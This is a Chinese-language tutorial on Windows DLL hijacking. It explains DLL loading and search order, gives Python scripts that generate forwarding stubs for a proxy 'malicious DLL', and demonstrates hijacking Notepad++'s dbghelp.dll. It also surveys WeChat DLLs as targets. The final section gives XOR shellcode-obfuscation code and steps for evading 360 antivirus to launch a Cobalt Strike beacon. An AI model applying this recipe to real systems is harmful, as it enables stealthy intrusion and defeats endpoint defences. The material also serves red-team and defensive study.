## 前置知识

### 什么是DLL

  * 计算机中，有些文件专门用于存储可以重复使用的代码块，例如常用的函数或类，我们通常称其为"库"（Library），以c语言举例，如下为大家展示的就是一个函数库，其提供了 add 和 sub 两个函数：

    
    
    // math.c
    int add(int a, int b) {
    	return a + b;
    }
    
    int sub(int a, int b) {
    	return a - b;
    }
    

  * 所谓链接库？即将我们上述的这个 math.c 源代码文件通过编译器进行编译后得到的二进制文件。

  * 一个完整的 C 语言项目可能包含多个 .c 源文件，项目运行需要经过 "编译"和"链接"两个阶段：

    
    
    1.编译：
    由编译器逐个对 c 源代码文件做词法分析、语法分析等操作，最终生成多个目标二进制文件，但由于它们相互之间会调用对方的函数或变量，还可能会调用某些链接库中的函数和变量，编译器无法跨文件找到它们确切的存储位置，所以这些目标二进制文件无法单独运行。
    2.链接：
    对于每个目标二进制文件中缺失的函数和变量的存储地址，由链接器负责修复，并最终将所有的目标文件和链接库组织成一个可执行文件。
    链接器完成链接工作的方式有两种：
    （1）无论目标二进制文件中缺失的地址位于其他其它目标文件还是链接库，链接器都会逐个找到各个目标文件中缺失的地址，采用此链接方式生成的可执行文件，可以独立载入内存中运行，我们称这种方式为静态链接，用到的链接库为静态链接库；
    （2）链接器先从所有目标二进制文件中找到部分缺失的地址，然后将所有目标文件组织成一个可执行文件。如此生成的可执行文件，仍然缺失部分函数和变量的地址，待文件执行时，需连同所有的链接库文件一起载入内存，再由链接器完成剩余的地址修复工作，才能正常执行。这种方式中，链接所有目标文件的方法仍属于静态链接，而载入内存后进行的链接操作称为动态链接，此时用到的链接库称为动态链接库DLL（Dynamic Link Library）。
    

  * 使用动态链接库好处在于减小了程序的体积，解决了空间的浪费，方便程序的更新和升级等等。

### DLL加载过程

#### 什么是DLL导出函数

  * 在windows平台上，动态链接库的函数或者变量要想被外界调用，必须在函数声明过程中通过__declspec(dllexport)修饰，而这些函数被称为导出函数，类似如下：

    
    
    __declspec(dllexport) int add(int a, int b);
    

#### 隐式加载

  * 以下图展示了隐式加载的过程：

    
    
    1.左边是dll程序编译过程，生成了 dll 文件和一个 lib 文件；这里的 lib 文件不是指的静态链接库，而是列出了这个 dll 中哪些函数和变量允许被外界调用，记录的信息包含函数和变量的名称以及它们在动态库中的存储位置。
    2.右边是主程序exe的编译过程，其需要引入dll程序的头文件，该头文件声明了要主程序需要使用的dll的导出函数，经过编译后生成的目标二进制文件，需要经过静态链接将lib文件和目标二进制文件链接到一起形成二进制可执行文件。
    3.最后可执行文件在载入内存后，同时由动态链接器识别到主程序所要引入的dll，进而将所需要的dll也载入内存，之后进程的主线程开始执行，应用程序启动运行。
    

![image](https://image.3001.net/images/20230512/1683880999_645dfc27620aa9b514de2.png!small)

#### 显式加载

  * 以下图展示了显式加载的过程：

    
    
    1.左边是dll程序编译过程，最终生成了一个dll文件和一个lib文件，但是与隐式加载不同的是，我们的主程序exe在编译和静态链接过程中并不需要引入dll的头文件和lib文件。
    2.主程序载入内存，主线程开始执行，应用程序启动运行。
    3.主线程或其中某个线程调用LoadLibrary（EX）函数，将DLL加载到进程的内存空间，然后该线程调用GetProcAddress函数获取需要调用的dll的导出函数的地址，最后通过函数指针传参调用该函数；
    （1）通过LoadLibrary函数指定DLL名称将DLL加载进内存；
    （2）通过GetProcAddress函数根据导出函数的名称获取内存地址；
    （3）通过函数指针传参调用该函数；
    

![image](https://image.3001.net/images/20230512/1683881012_645dfc34234c347973add.png!small)

#### 延迟加载

    
    
    什么是延迟加载？其本质和显式加载是一样的，都会调用LoadLibrary和GetProcAddress函数，都是在程序运行过程中才将DLL载入内存；但是在开发人员的使用层面上，比显式加载使用起来方便，开发者只需要在visual studio的链接器选项中设置一下即可让隐式加载的"主程序载入内存时一起载入所需要的DLL"转变为显式加载的"程序使用到该DLL的函数时再载入DLL"。
    

### DLL函数转发

  * DLL函数转发用途在于将对一个函数的调用转至另一个DLL中的函数，举个例子：

    
    
    A DLL，其导出函数有 sub_1，可以供主程序 exe 调用；
    B DLL，其导出函数有 add_2, sub_2，但是开发者开发时，标记了 sub_2 函数实际调用的是 A DLL 的 sub_1 函数，那么主程序在调用的时候：
    exe -> sub_2 -> sub_1，即 sub_2 只是起到一个中转的作用，前面讲到，我们在调用 DLL 的导出函数时，需要将对应的 DLL 载入内存，获取到其导出函数的内存地址，才能进行调用，所以 exe 在调用 B DLL的 add_2 和 sub_2 函数时，不仅需要将 B DLL 载入内存，而且还需要将 A DLL 载入内存。
    这个知识点对我们后续开发恶意DLL有很重要的作用。
    

### DLL重定向

  * 背景是基于某些公共的DLL，如 msvcrt.dll、user32.dll等等，这些公共的 dll 一般会提前被其它进程所加载，那么新的应用程序启动加载时，也是直接从内存中进行加载和调用，我们要想新应用程序加载我们的的 dll 来替代公共的 dll，就可以用到 dll 重定向的方式，其开启方式通过设置注册表：

    
    
    HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Option
    

  * 添加 DevOverrideEnable（DWORD）字段设置为1，然后重启后生效，此时应用程序启动时，优先加载我们的 "user32.dll"，这段一会儿讲完路径劫持后回来看一下；

## dll劫持原理及分类

### dll路径劫持

  * 背景是：当应用程序加载 DLL 时，如果是显式加载的情况下，仅指定 DLL 名称的话，其默认按如下顺序搜索 DLL 文件：

    
    
    1.应用程序所在的目录；
    2.系统目录，使用 GetSystemDirectory 获取该路径；（64位程序默认c:\windows\system32，32位程序默认为c:\windows\syswow64）
    3.16 位系统目录；
    4.Windows 目录（默认c:\windows\）；
    5.当前目录；
    6.PATH 环境变量中列出的目录；
    

  * 注：默认情况下安全 DLL 搜索模式被开启，即按上述顺序进行搜索，该搜索模式的开关由注册表项`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode`进行控制，若关闭，则 5.当前目录和 2.系统目录位置进行调换。

  * 如果是隐式加载和延迟加载的话，默认按如上方式进行DLL搜索，正因为这个搜索顺序的原因，使得攻击者可以将同名称的恶意DLL放置于正常DLL的搜索顺序之前，导致应用程序加载了恶意的DLL。

  * 举个栗子：

    
    
    A 应用程序需要加载 b.dll，正常的 b.dll 位于 C:\Windows\System32目录（即系统目录），如果我们将恶意的 b.dll 放置于应用程序所在目录的话，则在应用程序搜索 dll 过程中，会优先加载我们的恶意 dll。
    

### dll重定向劫持

  * 前面讲到，dll重定向是通过注册表项`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Option`进行控制的，我们可以对该注册表项添加`DevOverrideEnable（DWORD）`字段并设置为1来开启该功能，计算机重启后生效。

  * 其用途在于对于公共DLL的劫持，举个栗子，应用程序notepad++.exe加载了a.dll，该dll会被操作系统放到全局缓存中，当 xxx.exe 也要使用同名称的 a.dll 时，就不再去磁盘搜索该 dll，而是直接从缓存中读取该 DLL 加载到 xxx.exe 的进程空间中。

  * 但是有一种方式，可以让 xxx.exe 强制加载我们编写的 a.dll，而不去管全局缓存中是否存在该 dll，这里提到的即 DLL 重定向。

  * 但是该项技术不能用于劫持核心的动态链接库：如kernel32.dll和ntdll.dll；

    
    
    1.kernel32.dll：这个 DLL 文件包含了许多常用的系统函数，例如文件、内存、进程、线程、时间等操作函数。它是用户模式和内核模式之间的接口，负责管理系统资源、提供系统服务和执行系统调用等。在开发 Windows 应用程序时，经常会使用 kernel32.dll 来调用系统函数和操作系统服务。
    2.ntdll.dll：这个 DLL 文件包含了许多 Windows 操作系统内核的基本组件，例如进程、线程、内存、安全、对象管理等。它是 kernel32.dll 的基础，提供了更底层的系统调用接口，同时也提供了一些内核级别的函数和服务。在开发 Windows 内核模式驱动程序时，通常会使用 ntdll.dll 来调用内核级别的函数和服务。
    

  * 但是如 user32.dll，它是 Windows 操作系统的一个动态链接库文件，它包含了许多用户界面的函数和服务，主要负责管理和控制 Windows 应用程序的用户界面，它是可以被 dll 重定向劫持的。

## 开发恶意DLL

### 如何知道程序启动时加载的DLL

  * 可以使用process explorer或者process monitor来监控应用程序启动时加载的DLL，如下图，我们启动了一个 notepad.exe 程序，可以看到加载了如下这些 DLL。

![image](https://image.3001.net/images/20230512/1683881036_645dfc4c7af1501a4ddb4.png!small)

  * 我们可以从这里看到它加载的所有 DLL，但是没法去看到哪些是公共的 DLL，但是也没法区分，只能列举一些常见的：

    
    
    在 Windows 操作系统中，有很多常用的公共 DLL，这些 DLL 包含了许多常用的 Windows API 函数，是许多应用程序所依赖的核心 DLL。以下是一些常用的公共 DLL：
    
    1.kernel32.dll：包含了许多系统级别的函数，如内存管理、进程管理、线程管理、时间和日期操作、文件操作等。
    2.user32.dll：包含了许多用户界面函数，如窗口管理、菜单管理、消息处理、剪贴板操作等。
    3.gdi32.dll：包含了许多图形设备接口函数，如绘图、字体、颜色管理等。
    4.advapi32.dll：包含了许多高级系统函数，如注册表操作、安全权限管理、事件日志管理等。
    5.shell32.dll：包含了许多 shell 相关的函数，如文件和文件夹操作、快捷方式管理、控制面板管理等。
    6.comctl32.dll：包含了许多常用的控件和窗口样式，如按钮、编辑框、进度条、滚动条等。
    7.ole32.dll：包含了许多 COM 和 OLE 技术相关的函数，如对象创建、接口调用、内存管理等。
    
    需要注意的是，以上 DLL 只是一些常用的公共 DLL，实际上 Windows 操作系统中还有很多其他的公共 DLL，它们都是许多应用程序所依赖的核心 DLL。
    

  * 另外我们收缩一下这个范围，确保我们能劫持的DLL是当前应用程序在其目录搜索的DLL，比如notepad.exe文件目录为E:\notepad++\，则按如下添加filter选项：

Column| Relation| Value| Action  
---|---|---|---  
Process Name| contains| Notepad| Include  
Path| Contains| E:\notepad++\| Include  
Path| Contains| .*.dll| Include  
Path| Contains| .exe| Exclude  
Path| Contains| .xml| Exclude  
  
![image](https://image.3001.net/images/20230512/1683881047_645dfc57ca55e2e5edc1c.png!small)

  * 如上所示，结合process explorer比较直观的能看到当前notepad++.exe进程加载的dll的实际路径，通过process monitor我们发现notepad++.exe进程在启动的时候尝试在E:\notepad++\目录搜索某个DLL但是没有找到，这样在程序E:\notepad++\目录下搜索的DLL，劫持起来比较方便，我们只需要将开发的恶意DLL和notepad++.exe程序放在同一目录下，然后启动notepad++.exe就可以加载我们的恶意DLL了；

### 编写恶意DLL

  * 编写恶意DLL的时候，需要注意几个点：

    
    
    1.为了保证应用程序的正常执行，应用程序会调用正常DLL的导出函数，这意味着我们编写恶意DLL的时候也需要保证应用程序的正常执行，这里可以利用之前讲到的DLL函数转发的方式；
    

  * 这里以劫持notepad++.exe加载的dbghelp.dll为例，我们如果不用函数转发的方式，而直接将同名DLL放置于其目录的话，程序无法正常运行：

![image](https://image.3001.net/images/20230512/1683881058_645dfc62346e019fb2705.png!small)

  * 原因在于该应用程序会调用dbghelp.dll的导出函数，所以我们需要通过函数转发来实现该应用程序的正常执行；

  * 我们可以利用 .def 文件实现函数转发，以劫持，首先我们要生成def文件，需要找到其原始调用的DLL，如下图，可以通过process explorer来找到其加载的原始的dbghelp.dll的路径：

![image](https://image.3001.net/images/20230512/1683881066_645dfc6ac3f0d71ac5ce7.png!small)

  * 如果可知路径为：c:\Windows\System32\dbghelp.dll，可使用如下python代码来生成对应的def文件：

    
    
    """
    desc: 根据 pe 文件生成对应的 def 文件，其中包含所有转发的导出函数
    """
    
    import argparse
    import os
    import pefile
    
    def generate_def_file(pe_path: str, def_path: str):
        pe = pefile.PE(pe_path)
    
        with open(def_path, 'w') as f:
            f.write(f"LIBRARY {os.path.splitext(os.path.basename(pe_path))[0] + '.dll'}")
            f.write("\n")
    
            f.write("EXPORTS\n")
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                # Ignore non-exported symbols
                if not exp.name:
                    continue
    
                f.write("    " + exp.name.decode() + " = " + os.path.basename(pe_path).split('.')[0] + "_origin" + "." + exp.name.decode() + " @" + str(exp.ordinal) + "\n")
    
    if __name__ == '__main__':
        parser = argparse.ArgumentParser(description='Generate DEF file from a DLL file')
        parser.add_argument('--pe_path', required=True, help='The path of the DLL file to generate the DEF file from')
        parser.add_argument('--def_path', required=True, help='The path of the generated DEF file')
    
        args = parser.parse_args()
    
        generate_def_file(args.pe_path, args.def_path)
    

  * 生成def文件如下：

![image](https://image.3001.net/images/20230512/1683881076_645dfc74a6eacd9cee1a5.png!small)

  * 我们通过Visual Studio开发恶意DLL的时候，需要将其加入到项目中，目的是告诉静态链接器，这部分函数的调用需要由动态链接器来加载另一个DLL；

  * 然后在开发恶意DLL的时候，我们需要对待转发的函数进行声明和定义，但是这部分待转发的函数不需要精确的返回值、参数以及实现，我们可以通过自动化的生成（靠读取我们的def文件）

  * 根据def文件自动生成待转发函数的声明和定义的代码如下：

    
    
    """
    desc: 根据 def 文件生成对应的函数声明和函数定义
    """
    
    import argparse
    
    def generate_func_declaration(def_path, header_path):
        with open(def_path, 'r') as f:
            functions = []
            for line in f:
                if '=' in line:
                    func_name = line.split('=')[0].strip()
                    functions.append(func_name)
    
        with open(header_path, 'w') as f:
            f.write('#ifndef FUNCTION_DECLARATION_H\n')
            f.write('#define FUNCTION_DECLARATION_H\n')
            for func_name in functions:
                f.write('extern void {0}();\n'.format(func_name))
            f.write('#endif\n')
    
    def generate_func_definition(def_path, source_path):
        with open(def_path, 'r') as f:
            functions = []
            for line in f:
                if '=' in line:
                    func_name = line.split('=')[0].strip()
                    functions.append(func_name)
    
        with open(source_path, 'w') as f:
            for func_name in functions:
                f.write('void {0}() {{}}\n'.format(func_name))
    
    if __name__ == '__main__':
        parser = argparse.ArgumentParser(description='Generate function declaration and definition files from a .def file')
        parser.add_argument('--def_file', type=str, help='path to the .def file')
        parser.add_argument('--header_file', type=str, help='path to the header file to output')
        parser.add_argument('--source_file', type=str, help='path to the source file to output')
        args = parser.parse_args()
    
        generate_func_declaration(args.def_file, args.header_file)
        generate_func_definition(args.def_file, args.source_file)
    
        print('Function declaration and definition files generated successfully.')
    

  * 最终恶意DLL的结构图如下：

![image](https://image.3001.net/images/20230512/1683881086_645dfc7e4c29072ba4449.png!small)

  * 我们只需要在payload函数中编写我们的恶意代码即可，其它文件都可以自动生成；

  * 最终我们将原始的C:\Windows\System\dbghelp.dll复制一份到notepad++.exe目录下，并重命名为dbghelp_origin.dll，然后将我们编写的恶意的dbghelp.dll一同放置到notepad++.exe目录下，如下图：

![image](https://image.3001.net/images/20230512/1683881093_645dfc85cee565456502f.png!small)

  * 执行notepad++.exe，可以发现我们的"恶意代码（弹计算器）"被执行了，如下图：

![image](https://image.3001.net/images/20230512/1683881101_645dfc8d8332f43914717.png!small)

  * 可以看到我们的恶意dbghelp.dll和正常的dbghelp_origin.dll一同加载到了notepad++.exe的进程空间中；

  * 当然不止这一种开发恶意DLL的方式，其它方式暂不在这里讨论；

#### 按以上方法，劫持微信加载的DLL

  * 2023年3月份下载的最新版微信，其安装目录结构如下：

  * 它的安装目录比较新奇，就是其目录下有个名称为"版本号"的文件夹，里面存放了它要加载的大部分DLL，包括它要加载的一些微软的DLL，如dbghelp.dll

![image](https://image.3001.net/images/20230512/1683881112_645dfc98b9f9597cd2620.png!small)

  * 可能考虑到dbghelp.dll通过微软不断的更新，所以这里微信自带了一个版本的dbghelp.dll，考虑到可能在新版dbghelp.dll上不兼容之类的情况；

  * 另外还有一些微软的，但是微信没有带上的DLL，如version.dll，我们劫持来看一下，如下图：

![image](https://image.3001.net/images/20230512/1683881122_645dfca21703b483ea28a.png!small)

  * 为什么微信要加载微软的version.dll呢？这个dll对于微信来说有什么用呢？version.dll介绍如下：

    
    
    Version.dll is a Dynamic Link Library (DLL) file that is included with the Microsoft Windows operating system. It provides various functions related to version information for applications and other system components.
    
    When an application loads the version.dll, it can use its functions to retrieve information about the version of the operating system or other software components installed on the system. This information can be used by the application to determine compatibility requirements, to provide feature-specific behavior, or to identify bugs that may be related to a specific version of a component.
    
    Here are some common functions provided by version.dll:
    
    1.GetFileVersionInfo: Retrieves version information for a specified file.
    2.VerQueryValue: Retrieves a specific value from the version information for a specified file.
    3.GetFileVersionInfoSize: Determines the size of the version information for a specified file.
    4.GetFileVersionInfoEx: Retrieves extended version information for a specified file.
    5.GetFileVersionInfoSizeEx: Determines the size of the extended version information for a specified file.
    
    Overall, the version.dll is a useful tool for developers and applications that need to retrieve and analyze version information for various software components.
    

  * 那现在可以知道了，version.dll提供的API主要是关于检索文件相关版本信息、大小等信息的。

  * 上述都是劫持应用加载的微软的DLL，我们尝试劫持应用自己的DLL呢？我们先分析一下微信程序加载的DLL的分类，如下图：

![image](https://image.3001.net/images/20230512/1683881132_645dfcac5ded20db5473e.png!small)

  * 微信的DLL有存在以下几种情况：

    
    
    # 所有微信自带的DLL（带有腾讯数字签名的DLL）：
    WeUIResource.dll
    WeChatWin.dll
    WeChatResource.dll
    wcprobe.dll
    VoipEngine.dll
    mmtcmalloc.dll
    mmmojo.dll
    libFFmpeg.dll
    andromeda.dll
    
    1.WeUIResource.dll # 不存在导出函数
    2.WeChatWin.dll、WeChatResource.dll、VoipEngine.dll、andromeda.dll # 导出函数乱码，类似如下：
    

![image](https://image.3001.net/images/20230512/1683881140_645dfcb4e4f9cc1aac40a.png!small)

  * 乱码导致通过`pefile_generate_def.py`生成的.def文件中的函数也是？，进而不能用（不是不能用，是我不会~）；

    
    
    3.wcprobe.dll # 导出函数只有序号，没有名称，如下图：
    

![image](https://image.3001.net/images/20230512/1683881149_645dfcbd4ac12ba81e007.png!small)

    
    
    4.mmtcmalloc.dll、mmmojo.dll、libFFmpeg.dll、 # 导出函数较少，没有乱码，比较适合劫持，如下图：
    

![image](https://image.3001.net/images/20230512/1683881157_645dfcc58b1aa873c587f.png!small)

![image](https://image.3001.net/images/20230512/1683881164_645dfccc3a4906b9ccbe3.png!small)

![image](https://image.3001.net/images/20230512/1683881173_645dfcd53bd257d465ba0.png!small)

## DLL劫持在现实攻击活动中的应用

### APT攻击下的dll劫持应用

  * 某APT组织劫持迅雷的DLL搞事情，参考链接：https://www.welivesecurity.com/2023/02/16/these-arent-apps-youre-looking-for-fake-installers/

![image](https://image.3001.net/images/20230512/1683881182_645dfcdeb474ad4f1ddef.png!small)

### dll劫持在实际终端安全产品中的绕过效果

  * 利用notepad++程序的DLL，上线Cobalt Strike；

    
    
    # 分三步：
    1.需要对 Cobalt Strike 生成的 shellcode 进行加密混淆绕过 360 静态查杀；
    2.需要对我们编写的恶意 DLL 所使用的敏感 API 如VirtualAlloc、WriteProcessMemory、CreateThread进行动态调用以避免在DLL导入表中连续出现好几个敏感的 API；
    3.通过劫持 notepad++ 的 DLL，绕过 360 动态查杀上线 Cobalt Strike；
    

  * xor加密混淆：

    
    
    #include <stdio.h>
    
    /* 将 shellcode 进行 xor 加密并输出到 encrypted_data.c 文件中 */
    
    int main() {
        /* length: 892 bytes */
        /* 如下是 shellcode xor 加密操作 */
        unsigned char buf[] = "你的shellcode";
    
        unsigned char key = 0x5A; // 设置加密密钥
        int length = sizeof(buf) / sizeof(unsigned char);
        for (int i = 0; i < length; i++) {
           buf[i] ^= key; // 将密钥与每个字节进行异或操作
        }
    
        FILE* fp = fopen("encrypted_data.c", "w"); // 打开文件以写入数据
        if (!fp) {
           printf("Error opening file for writing!\n");
           return 1;
        }
    
        fprintf(fp, "unsigned char buf[] = {"); // 输出数组定义的头部
    
        // 输出加密后的数据
        for (int i = 0; i < length; i++) {
           fprintf(fp, "0x%02X", buf[i]);
           if (i < length - 1) {
               fprintf(fp, ",");
           }
        }
    
        fprintf(fp, "};"); // 输出数组定义的尾部
    
        fclose(fp);
        return 0;
    }
    

  * 最终代码如下：

![image](https://image.3001.net/images/20230512/1683881195_645dfceb5c7f73824f6f8.png!small)

  * CobaltStrike上线：

![image](https://image.3001.net/images/20230512/1683881202_645dfcf2dc9ffa302f893.png!small)

